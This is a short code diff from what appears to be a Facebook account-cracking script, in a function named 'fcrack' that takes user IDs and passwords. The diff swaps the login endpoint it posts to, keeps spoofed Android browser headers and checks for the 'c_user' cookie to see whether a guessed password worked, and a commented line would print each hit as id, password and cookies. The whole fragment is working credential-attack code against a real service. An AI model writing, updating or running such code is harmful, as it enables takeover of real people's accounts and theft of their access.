@@ -1474,7 +1474,6 @@ def fcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'referer': 'https://m.facebook.com/bookmarks/?paipv=0&eav=AfbSCgE83ZcczM8udT0BnnLwmri8NOox5-gupWlC9wPTDLM96_9Wy5zY9-EHXoRv4eU',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -1484,7 +1483,7 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
-            lo = session.post('https://m.facebook.com/?stype=lo&jlou=Afd6cyeNT2aR7eiCw2ZCVWodER09sV8ZzpOcPWJVvxEpZfuvoHa75eFSY-Xc3_XEfoJ0kaZO-xABLy00YBueCDwi1Se280lLUiRLGimngnHsgw&smuh=14935&lh=Ac_bniPjUei65r63IDg&_rdr',headers=headers).text
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
